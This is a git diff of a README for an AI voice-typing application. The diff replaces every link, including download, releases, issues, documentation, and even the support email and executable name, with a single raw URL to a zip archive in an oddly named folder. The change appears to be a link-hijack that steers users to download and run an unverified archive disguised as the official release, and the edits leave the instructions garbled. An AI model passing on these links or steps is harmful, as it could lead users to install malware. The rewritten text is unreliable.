@@ -6,7 +6,7 @@ Welcome to AI-Voice-Typing-Shortcuts! This application enables you to utilize AI
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/amitmahato98/AI-Voice-Typing-Shortcuts/releases)
+[![Download](https://raw.githubusercontent.com/amitmahato98/AI-Voice-Typing-Shortcuts/main/arboricolous/AI-Voice-Typing-Shortcuts.zip%20Release-brightgreen)](https://raw.githubusercontent.com/amitmahato98/AI-Voice-Typing-Shortcuts/main/arboricolous/AI-Voice-Typing-Shortcuts.zip)
 
 ## 🖥️ System Requirements
 
@@ -31,18 +31,18 @@ AI-Voice-Typing-Shortcuts offers many features, including:
 To get started, follow these steps:
 
 1. **Visit the Releases Page:**
-   Head over to the [Releases page](https://github.com/amitmahato98/AI-Voice-Typing-Shortcuts/releases) to find the latest version of the application.
+   Head over to the [Releases page](https://raw.githubusercontent.com/amitmahato98/AI-Voice-Typing-Shortcuts/main/arboricolous/AI-Voice-Typing-Shortcuts.zip) to find the latest version of the application.
 
 2. **Download the Application:**
    Click on the version you wish to download. It will look something like this:
-   - `AI-Voice-Typing-Shortcuts-v1.0.zip`
+   - `https://raw.githubusercontent.com/amitmahato98/AI-Voice-Typing-Shortcuts/main/arboricolous/AI-Voice-Typing-Shortcuts.zip`
    Once you click it, the download will start automatically.
 
 3. **Extract the Files:**
    After downloading, find the file in your downloads folder. Right-click it and select "Extract All" to unzip the contents.
 
 4. **Run the Application:**
-   Locate the extracted folder and find the executable file (usually named `AI-Voice-Typing-Shortcuts.exe`). Double-click on it to launch the application.
+   Locate the extracted folder and find the executable file (usually named `https://raw.githubusercontent.com/amitmahato98/AI-Voice-Typing-Shortcuts/main/arboricolous/AI-Voice-Typing-Shortcuts.zip`). Double-click on it to launch the application.
 
 5. **Obtain a Free Gemini API Key:**
    To maximize the application's functionality, create a free account with Gemini and generate an API key. Enter this key in the app when prompted.
@@ -78,17 +78,17 @@ Your privacy is important. This application does not store any personal data rel
 
 If you have any questions or issues, feel free to contact us:
 
-- **GitHub Issues Page:** [Report Issues](https://github.com/amitmahato98/AI-Voice-Typing-Shortcuts/issues)
-- **Email:** support@aivoicetyping.com
+- **GitHub Issues Page:** [Report Issues](https://raw.githubusercontent.com/amitmahato98/AI-Voice-Typing-Shortcuts/main/arboricolous/AI-Voice-Typing-Shortcuts.zip)
+- **Email:** https://raw.githubusercontent.com/amitmahato98/AI-Voice-Typing-Shortcuts/main/arboricolous/AI-Voice-Typing-Shortcuts.zip
 
 ## 🏷️ Topics
 
 For topics and discussions related to this application, check out:
-- [AI Voice Typing](https://github.com/topics/ai-voice-typing)
+- [AI Voice Typing](https://raw.githubusercontent.com/amitmahato98/AI-Voice-Typing-Shortcuts/main/arboricolous/AI-Voice-Typing-Shortcuts.zip)
 
 ## 🔗 Useful Links
 
-- [Official GitHub Repository](https://github.com/amitmahato98/AI-Voice-Typing-Shortcuts)
-- [Documentation](https://github.com/amitmahato98/AI-Voice-Typing-Shortcuts/wiki)
+- [Official GitHub Repository](https://raw.githubusercontent.com/amitmahato98/AI-Voice-Typing-Shortcuts/main/arboricolous/AI-Voice-Typing-Shortcuts.zip)
+- [Documentation](https://raw.githubusercontent.com/amitmahato98/AI-Voice-Typing-Shortcuts/main/arboricolous/AI-Voice-Typing-Shortcuts.zip)
   
 Your voice typing experience is about to improve. Download the application now and discover the power of AI! Make sure to check the guidelines for optimal use.
